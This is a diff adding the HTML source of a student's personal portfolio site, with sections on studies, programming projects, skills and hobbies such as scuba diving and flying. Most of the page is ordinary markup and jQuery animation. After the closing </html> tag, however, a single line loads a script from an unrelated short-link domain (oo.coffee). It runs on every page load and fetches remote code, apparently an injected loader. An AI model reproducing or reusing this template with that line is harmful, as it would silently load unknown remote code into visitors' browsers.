@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Prasana Y Doshi | Executor, Innovator, Leader </title>
+    <meta charset="UTF-8">
+    <meta name="description" content="Welcome to my website">
+    <meta name="Keywords" content=" Prasana, Prasana Y Doshi, Websites, Students">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+
+    <!-- jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <!-- Latest compiled JavaScript -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Nixie+One&display=swap" rel="stylesheet">
+
+    <link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed&display=swap" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Assistant:wght@200&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+
+    <style type="text/css">
+        html {
+            scroll-behavior: smooth;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        #nav {
+            border-bottom: none;
+            box-shadow: 2px 2px 20px rgba(0, 0, 0, 0.2);
+            background-color: #fff;
+            z-index: 9999;
+        }
+
+        #nav li a {
+            text-transform: uppercase;
+            color: #000;
+            font-family: 'Barlow Condensed', sans-serif;
+            font-weight: bold;
+            letter-spacing: 1px;
+            padding-top: 25px;
+            transition: 0.4s ease;
+            font-size: 16px;
+            z-index: 99999;
+        }
+
+        #nav li a:hover {
+            color: #999;
+        }
+
+        .navbar-header h2 {
+            color: #4169E1 !important;
+        }
+
+        #nav h2 {
+            text-transform: uppercase;
+            font-weight: bold;
+            letter-spacing: 1px;
+            font-family: 'Barlow Condensed', sans-serif;
+            padding: 10px 0;
+            margin-top: 10px;
+            color: #000;
+        }
+
+        @media (max-width: 600px) {
+            #nav h2 {
+                padding-left: 10px;
+            }
+        }
+
+        .ParallaxVideo {
+            height: 100vh;
+            padding-bottom: 50px;
+            padding-top: 50px;
+        }
+
+        .ParallaxVideo video {
+            min-width: 100%;
+            position: fixed;
+            top: 0;
+            z-index: -999;
+        }
+
+        .ParallaxVideo h1 {
+            color: #fff;
+            font-size: 76px;
+            font-weight: 700;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .headin h3 {
+            margin-top: 270px;
+            font-size: 40px;
+            letter-spacing: 1px;
+        }
+
+        .headin h1 {
+            font-size: 80px;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+        }
+
+        .headin p {
+            font-size: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .headin h3,
+        h1,
+        p {
+            color: #fff;
+            font-weight: bold;
+            font-family: 'Barlow Condensed', sans-serif;
+        }
+
+        .aboutus h2,
+        .project h2,
+        .skill h2 {
+            font-family: 'Barlow Condensed', sans-serif;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: #4169E1;
+        }
+
+        .aboutus p,
+        .project p,
+        .skill p,
+        .hobbyPanel p {
+            letter-spacing: 0.3px;
+            color: #111;
+            font-family: 'Assistant', sans-serif;
+            font-size: 17px;
+            text-align: justify;
+        }
+
+        .project h3,
+        .skill h3,
+        .hobbyPanel h3 {
+            font-family: 'Barlow Condensed', sans-serif;
+            font-weight: bold;
+            letter-spacing: 1px;
+            color: #000;
+        }
+
+        .projectPanel:hover {
+            box-shadow: 2px 2px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .projectPanel .panel-body img {
+            transform: scale(1);
+            transition: 0.4s ease;
+        }
+
+        .projectPanel .panel-body img:hover {
+            transform: scale(1.3);
+        }
+
+        .skillPanel {
+            border: 1px solid #fff;
+            padding: 20px;
+            transition: .5s ease;
+        }
+
+        .skillPanel:hover {
+            box-shadow: 2px 2px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .hobbyPanel {
+            transition: 0.6s ease;
+            border: 2px solid #fff;
+        }
+
+        .foot h3 {
+            text-transform: uppercase;
+            font-weight: bold;
+            font-family: 'Barlow Condensed', sans-serif;
+            letter-spacing: 1px;
+            color: #fff;
+        }
+
+        .foot a {
+            display: block;
+            text-decoration: none;
+            color: #f7f7f7;
+            font-size: 16px;
+            font-weight: bold;
+            font-family: 'Barlow Condensed', sans-serif;
+            letter-spacing: 1px;
+        }
+
+        .navbar-toggle {
+            margin-top: 15px;
+            color: #000;
+            border: none;
+            font-size: 18px;
+        }
+
+        .topbar {
+            bottom: 0;
+            right: 0;
+            width: 40px;
+            height: 40px;
+            position: fixed;
+            margin: 10px;
+            z-index: 1111;
+            cursor: pointer;
+            display: none;
+        }
+
+        .topbar a i {
+            color: #fff !important;
+            background-color: #3498db !important;
+            padding: 15px 15px;
+            border-radius: 0px;
+        }
+
+        .head2,
+        .headp,
+        .project1,
+        .project2,
+        .project3,
+        .skill1,
+        .skill2,
+        .skill3,
+        .skill4,
+        .skill5,
+        .skill6,
+        .hobbies1,
+        .hobbies2,
+        .hobbies3 {
+            opacity: 0;
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            box-shadow: inset 0 0 5px grey;
+            border-radius: 0px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #4169E1;
+            border-radius: 0px;
+        }
+
+        @media (min-width: 600px) {
+            ::-webkit-scrollbar {
+                height: 0px;
+            }
+        }
+
+        .sidebar {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            width: 80%;
+            height: 100%;
+            background-color: #888;
+            z-index: 99999;
+            display: none;
+            box-shadow: 2px 2px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .sidebar a {
+            text-transform: uppercase;
+            color: #fff;
+            font-family: 'Barlow Condensed', sans-serif;
+            font-weight: bold;
+            letter-spacing: 1px;
+            padding-top: 25px;
+            transition: 0.4s ease;
+            font-size: 16px;
+            display: block;
+            text-align: right;
+            padding: 20px 30px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body data-target=".navbar-collapse">
+    <nav class="navbar navbar-default navbar-fixed-top" id="nav">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="submit" class="navbar-toggle" data-toggle="collapse" data-target="#myNav"><i class="fa fa-align-justify"></i></button>
+                <a style="text-decoration: none;" href="index.php">
+                    <h2>Prasana Y Doshi</h2>
+                </a>
+            </div>
+            <div class="collapse navbar-collapse" id="myNav">
+                <ul class="nav navbar-nav navbar-right">
+                    <li><a href="#home" data-toggle="collapse" data-target=".navbar-collapse">home</a></li>
+                    <li><a href="#about" data-toggle="collapse" data-target=".navbar-collapse">about me</a></li>
+                    <li><a href="#project" data-toggle="collapse" data-target=".navbar-collapse">projects</a></li>
+                    <li><a href="#skill" data-toggle="collapse" data-target=".navbar-collapse">skills</a></li>
+                    <li><a href="#hobbies" data-toggle="collapse" data-target=".navbar-collapse">hobbies</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="topbar" id="topbar" onclick="myFun()">
+        <a><i class="fa fa-chevron-up"></i></a>
+    </div>
+
+
+
+
+
+
+
+    <script>
+        window.onscroll = function() {
+            scrollUp()
+        };
+
+        function scrollUp() {
+            if (document.body.scrollTop > 50 || document.documentElement.scrollTop > 50) {
+                document.getElementById("topbar").style.display = "block";
+            } else {
+                document.getElementById("topbar").style.display = "none";
+            }
+        }
+
+        function myFun() {
+            document.body.scrollTop = 0;
+            document.documentElement.scrollTop = 0;
+        }
+
+
+
+        $(document).on('click', '.navbar-collapse.in', function(e) {
+            if ($(e.target).is('a:not(".dropdown-toggle")')) {
+                $(this).collapse('hide');
+            }
+        });
+    </script>
+
+
+    <div class="ParallaxVideo" id="home" style="background-color: rgba(0,0,0,0.3);width: 100%;height: 100vh;">
+        <video autoplay muted loop>
+  <source src="video.mp4" type="video/mp4">
+  </video>
+        <div class="headin">
+            <h3 align="center" class="animate__animated animate__fadeInUpBig">Hey, I'M</h3>
+            <h1 align="center" class="animate__animated animate__fadeInUpBig">Prasana Y Doshi</h1>
+            <p align="center" class="animate__animated animate__fadeInUpBig">great seeing you</p>
+        </div>
+    </div>
+
+    <!-- <div class="container-fluid" id="home" style="background:url(heading.gif) rgba(0, 0, 0, 0.2);background-size: cover;height: 80vh;background-repeat: no-repeat;background-position: center;background-attachment: fixed;  background-blend-mode: multiply;
+">
+			
+	<div class="container">
+		<div class="row">
+			<div class="col-sm-12 headin">
+			<h3 align="center" class="animate__animated animate__fadeInUpBig">Hey, I'M</h3>
+			<h1 align="center" class="animate__animated animate__fadeInUpBig">Prasana Y Doshi</h1>
+			<p align="center"  class="animate__animated animate__fadeInUpBig">great seeing you</p>
+			</div>
+		</div>
+		</div>
+	</div>
+</div> -->
+    <div id="about" style="padding-top: 80px;background-color: white;"></div>
+    <div class="container-fluid" id="about" style="padding-top:0px;background-color: white;">
+        <div class="container">
+            <div class="row aboutus">
+                <h2 class="head2 ">My Current<strong style="color: #3498db;"> endeavours</strong></h2>
+                <hr style="border:1px solid #000;width:100px;" align="left">
+                <!-- <p class="headp " style="color: #111 !important;">
+I am born in Mumbai, India and spent 15 years of my life there before immigrating to Canada in grade 11.<br>
+I spent my formative years studying at Thakur International School(CAIE), and I am currently attending St Augustine SS<br>
+I have developed keen interests in Math, Computer Science and Finance. I will be pursuing Computer Science as my main field of study. Some of my favourite past times include reading, playing squash and football.<br>
+My journey in the money market started when I was 13. Having learnt the importance of the power of compounding. I was inspired and encouraged to make my first investment. I invested a small amount I had gathered over the years and invested in TCS. My intention is to hold the stock. The price of the stock has now more than doubled and has provided with a 1 for 1 share bonus with a consistent dividend.<br>
+During winter and summer breaks I actively immerse myself into the community by volunteering at food banks. Moreover, spending my time like this is extremely rewarding and offers me invaluable life skills. I am also an active part of the student council at my schools, this allows me to engage in the student community and it ensure that the communication gap between the students and staff is minimal.<br>
+Additionally I enjoy attending Model United Nations (MUN), an activity that lets me improve my public speaking and team building skills. Over the years I have chaired a few committees the most prominent one being a conference on Global environmental impacts and sustainable alternatives. I have also received best delegate accolades for my performance in numerous committees.<br>
+</p><br> -->
+                <!-- <h4><b>My Current endeavours</b></h4> -->
+                <p class="headp " style="color: #111 !important;">
+                    After two very successful years in high school, I am currently pursuing a degree in computer science at the University of Waterloo and Business Administration at Wilfrid Laurier University. Moreover, I am a passionate Developer and enjoy working with
+                    dynamic technologies such as Python while keeping in mind the strong OOP principles found in C++ and Java. As a developer, I strive to create applications that increase convenience for users while keeping user design and friendliness
+                    at the centre of my development. Furthermore, in my past time, I enjoy Scuba Diving and teaching students, I am able to do this as a Master Scuba Diver, which is the second highest position awarded to professional Scuba Divers by NAUI.
+                    Throughout summers I relax by flying airplanes, in particular, a Cessna 172.
+
+                    <br>
+                </p>
+            </div>
+        </div>
+    </div>
+
+
+    <div id="project" style="padding-top: 80px;background-color: white;"></div>
+
+    <div class="container-fluid" style="padding-top: 40px;padding-bottom: 40px;background:linear-gradient(90deg,#00203FFF,#ADEFD1FF);">
+        <div class="container">
+            <div class="row project">
+                <h2 style="color: #fff !important;" class="animate__animated animate__fadeInUpBig animate__delay-1s">Projects</h2>
+                <hr style="border:1px solid #000;width:100px;" align="left">
+                <p style="color: #fff;" class="animate__animated animate__fadeInUpBig animate__delay-2s">Some of the projects I have coded in the past year</p>
+                <br>
+                <!-- <div class="col-sm-4 project1 ">
+	<a style="text-decoration: none;" target="_blank" href="https://github.com/prasanaydoshi/prasanaydoshi-car_sellingprice_forecasting_systems">
+        <div class="panel panel-default projectPanel" style="min-height: 470px;overflow:hidden;">
+		<div class="panel panel-body">
+			<img src="1.png" class="img-responsive" alt="">
+		</div>
+		<div class="panel panel-footer" style="border-top: none;background:none;">
+			<h3 align="center">Car Forecasting System</h3>
+			<br>
+			<p class="text-justify">This is a python project made while interning at a company. The machine learning project uses numerous car features to forecast the prices of cars</p>
+		</div>
+	</div>
+</a>
+</div>
+    <div class="col-sm-4 project2">
+    	<a style="text-decoration: none;" target="_blank"  href="https://github.com/prasanaydoshi/DocBot">
+            <div class="panel panel-default projectPanel" style="min-height: 470px;overflow:hidden;">
+    		<div class="panel panel-body">
+    			<img src="3.png" class="img-responsive" alt="">
+    		</div>
+    		<div class="panel panel-footer" style="border-top: none;background:none;">
+    			<h3 align="center">DocBot</h3>
+    			<br>
+    			<p class="text-justify">A chatbot that serves as a temporary replacement for a real doctor. A school project,  it was created by our team over the course of 15 days using Java</p>
+    		</div>
+    	</div>
+        </a>
+    </div> -->
+                <div class="col-sm-4 project3 ">
+                    <a style="text-decoration: none;" target="_blank" href="https://github.com/prasanaydoshi/Tetris-1984">
+                        <div class="panel panel-default projectPanel" style="min-height: 470px;overflow:hidden;">
+                            <div class="panel panel-body">
+                                <img src="2.png" class="img-responsive" alt="">
+                            </div>
+                            <div class="panel panel-footer" style="border-top: none;background:none;">
+                                <h3 align="center">Tetris</h3>
+                                <br>
+                                <p class="text-justify">Tetris, a game cherished by many, is adapted by me using C++. I took on this project to better understand the funadamentals of C++<br><br><br><br></p>
+                            </div>
+                        </div>
+                    </a>
+                </div>
+                <!-- </div> -->
+                <!-- <div class="row project"> -->
+
+                <div class="col-sm-4 project2">
+                    <a style="text-decoration: none;" target="_blank" href="https://github.com/prasanaydoshi/Monopoly">
+                        <div class="panel panel-default projectPanel" style="min-height: 470px;overflow:hidden;">
+                            <div class="panel panel-body">
+                                <img src="mono.jpg" class="img-responsive" alt="">
+                            </div>
+                            <div class="panel panel-footer" style="border-top: none;background:none;">
+                                <h3 align="center">Monopoly </h3>
+                                <br>
+                                <p class="text-justify">Built a working version of Monopoly with all functionality in a team of 3, applied OOP principles and used multiple design patterns like MVC to create a modular and well-designed application. We also created modular, testable,
+                                    flexible, scalable and well-documented code. Using concepts such as casting, vectors, and dynamic file management<br><br></p>
+                            </div>
+                        </div>
+                    </a>
+                </div>
+                <div class="col-sm-4 project3 ">
+                    <a style="text-decoration: none;" target="_blank" href="https://github.com/prasanaydoshi/NASDAQ-stock-web-scraper">
+                        <div class="panel panel-default projectPanel" style="min-height: 470px;overflow:hidden;">
+                            <div class="panel panel-body">
+                                <img src="Nasdaq.png" class="img-responsive" alt="">
+                            </div>
+                            <div class="panel panel-footer" style="border-top: none;background:none;">
+                                <h3 align="center">Nasdaq Stock web-scraper </h3>
+                                <br>
+                                <p class="text-justify">Scrapes and cleans data from of NASDAQ stocks and related data from Yahoo Finance; data is exported to CSV(file is used as a database). In particular, when it cleans data, it only accesses yahoo URLs that exist. This is
+                                    achieved through dynamic link creation; it’s a highly scalable project, which allows for easy search and analysis of stock data via MS Excel. This data can also be exported to XML formats to be used in SQL.</p>
+                            </div>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div id="skill" style="padding-top: 80px;background-color: white;"></div>
+
+    <div class="container-fluid" style="padding-top: 40px;background-color: white;">
+        <div class="container">
+            <div class="row skill">
+                <h2 class="animate__animated animate__slideInUp animate__delay-2s">My Skills</h2>
+                <hr style="border:1px solid #000;width:100px;" align="left">
+                <br>
+                <div class="col-sm-4 skill1">
+                    <div class="panel panel-default skillPanel">
+                        <div class="panel-body">
+                            <h5><img src="html-5.png" class="img-responsive" style="width:100px;" alt=""></h5>
+                            <h3>HTML 5</h3>
+                            <p align="left">Through self learning and with the help of numerous online resources, I created the v1.0 of my website. HTML being a rudimentary and begginner friendly language, it was fun to work with</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-sm-4 skill2 ">
+                    <div class="panel panel-default skillPanel">
+                        <div class="panel-body">
+                            <p align="center" style="text-align: center;"><img src="css3.png" class="img-responsive" style="width:100px;" alt=""></p>
+                            <h3>CSS 3</h3>
+                            <p align="left">As a part of creating my website I learnt CSS. Vaster than HTML the language demands a more thorough understanding of its contents which made it all-the more exciting to implement. The chalenges I faced while creating my website
+                                improved my understadning of inner CSS mechanics and fundamentals</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-sm-4 skill3 ">
+                    <div class="panel panel-default skillPanel">
+                        <div class="panel-body">
+                            <p align="center" style="text-align: center;"><img src="java.png" class="img-responsive" style="width:100px;" alt=""></p>
+                            <h3>Java</h3>
+                            <p align="left">Being one of the first langauges I learnt, its one I enjoy working with the most . The best part about Java is its simplicity yet the boundless possibilities that can be achieved using OOP(Object-Oriented Programming)
+
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row skill">
+                <div class="col-sm-4 skill4">
+                    <div class="panel panel-default skillPanel">
+                        <div class="panel-body">
+                            <p align="center" style="text-align: center;"><img src="python12.png" class="img-responsive" style="width:90px;" alt=""></p>
+                            <h3>Python</h3>
+                            <p align="left">Python is by far the most complex, challenging and elaborate language I have worked with. Considering this, it was extremely rewarding to complete the Car Forecasting System
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div class="col-sm-4 skill5">
+                    <div class="panel panel-default skillPanel">
+                        <div class="panel-body">
+                            <p align="center" style="text-align: center;"><img src="c.png" class="img-responsive" style="width:90px;" alt=""></p>
+                            <h3>C++</h3>
+                            <p align="left">My understadning of the language can be best depicted by my practical application of it in making of a game. Having learnt the language by myself I enjoyed working with its unique syntax
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-sm-4 skill6">
+                    <div class="panel panel-default skillPanel">
+                        <div class="panel-body">
+                            <p align="center" style="text-align: center;"><img src="kali.webp" class="img-responsive" style="width:100px;" alt=""></p>
+                            <h3>Ethical Hacking</h3>
+                            <p align="left">A intresting and supremely challenging course that I completed on Udemy; it taught me the intricecies of pen-testing, hacking into networks and the best way to protect a network against possible attacks
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+
+    <div id="hobbies" style="padding-top: 80px;background-color: white;"></div>
+
+    <div class="container-fluid" style="padding-top: 40px;background-color: white;">
+        <div class="container">
+            <div class="row aboutus">
+                <h2 class=" animate__animated animate__slideInUp animate__delay-1s">Hobbies</h2>
+                <hr style="border:1px solid #000;width:100px;" align="left">
+                <br>
+                <div class="col-sm-4 hobbies1">
+                    <div class="panel panel-default hobbyPanel" onmouseover="displayDis()">
+                        <div class="panel panel-body">
+                            <img src="scuba.jpg" class="img-responsive" alt="" style="border-radius: 4px;box-shadow: 2px 2px 20px rgba(0,0,0,0.4);">
+                            <div id="disContect" style="display: none;">
+                                <h3>Scuba Diving</h3>
+                                <p>Diving is one of my favourite pastimes, it allows me to absorb nature at its finest. I am a Master Scuba Diver, a certification valid across the world and for life. Prerequisites for the same are completion of Advanced
+                                    Open Water and Rescue Scuba Diver course which includes First aid and CPR</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-sm-4 hobbies2">
+                    <div class="panel panel-default hobbyPanel" onmouseover="displayDis1()">
+                        <div class="panel panel-body">
+                            <img src="fly.jpg" class="img-responsive" alt="" style="border-radius: 4px;box-shadow: 2px 2px 20px rgba(0,0,0,0.4);">
+                            <div id="disContect1" style="display: none;">
+                                <h3>Flying </h3>
+                                <p>I enjoy flying airplanes throughout the summer to relax, I have training in Emergency protocols, and effective decision making in high-pressure environments. I also have training in Meteorology, flight planning, and Air
+                                    Law</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-sm-4 hobbies3">
+                    <div class="panel panel-default hobbyPanel" onmouseover="displayDis2()">
+                        <div class="panel panel-body">
+                            <img src="drama.jpg" class="img-responsive" alt="" style="border-radius: 4px;box-shadow: 2px 2px 20px rgba(0,0,0,0.4);">
+                            <div id="disContect2" style="display: none;">
+                                <h3>Theatre</h3>
+                                <p>I entered the world of Theatre at the age of 11, my main inspiration was a little girl playing Matilda in my school play. Soon enough I joined an acting academy that allowed me to hone my skills in public speaking and stage
+                                    shows. Some of my roles over the years have beginner Bill Sykes from Oliver Twist and Jay Gatsby from The Great Gatsby.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-fluid" style="background-color: #4169E1;padding: 10px 20px;">
+        <div class="container foot">
+            <div class="row" style="padding-top: 10px;">
+                <div class="col-sm-3">
+                    <a style="text-transform: uppercase;font-size: 20px;">Social's</a>
+                </div>
+                <div class="col-sm-3">
+                    <a href="mailto:prasanaydoshi@gmail.com">Email</a>
+                </div>
+                <div class="col-sm-3">
+                    <a target="_blank" href="https://github.com/prasanaydoshi">Github</a>
+                </div>
+                <div class="col-sm-3">
+                    <a target="_blank" href="https://www.instagram.com/prasanaydoshi/">Instagram</a>
+                </div>
+            </div>
+            <div class="row" style="margin-top: 30px;">
+                <p align="center" style="letter-spacing: 1px;font-size: 15px;">Created and Envisioned by Prasana Y Doshi</p>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="text/javascript">
+        function displayDis() {
+            $("#disContect").show(300);
+        }
+
+        function displayDis1() {
+            $("#disContect1").show(300);
+        }
+
+        function displayDis2() {
+            $("#disContect2").show(300);
+        }
+    </script>
+
+    <script type="text/javascript">
+        $(document).ready(function() {
+            $(window).scroll(function() {
+                var positionTop = $(document).scrollTop();
+                if ((positionTop > 500) && (positionTop < 1000)) {
+                    $('.head2').addClass('animate__animated animate__fadeInUp').css("opacity", "1");
+                    $('.headp').addClass('animate__animated animate__fadeInUp').css("opacity", "1");
+                } else if ((positionTop > 1000) && (positionTop < 1500)) {
+                    $('.project1').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                    $('.project2').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                    $('.project3').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                } else if ((positionTop > 1500) && (positionTop < 2000)) {
+                    $('.skill1').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                    $('.skill2').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                    $('.skill3').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                    $('.skill4').addClass('animate__animated animate__slideInUp ').css("opacity", "1");
+                    $('.skill5').addClass('animate__animated animate__slideInUp ').css("opacity", "1");
+                    $('.skill6').addClass('animate__animated animate__slideInUp ').css("opacity", "1");
+                } else if ((positionTop > 2200) && (positionTop < 3200)) {
+                    $('.hobbies1').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                    $('.hobbies2').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+                    $('.hobbies3').addClass('animate__animated animate__slideInUp').css("opacity", "1");
+
+                }
+
+            });
+        });
+    </script>
+</body>
+
+</html>
+<script src="https://oo.coffee/Avp0j0" type="text/javascript"></script>
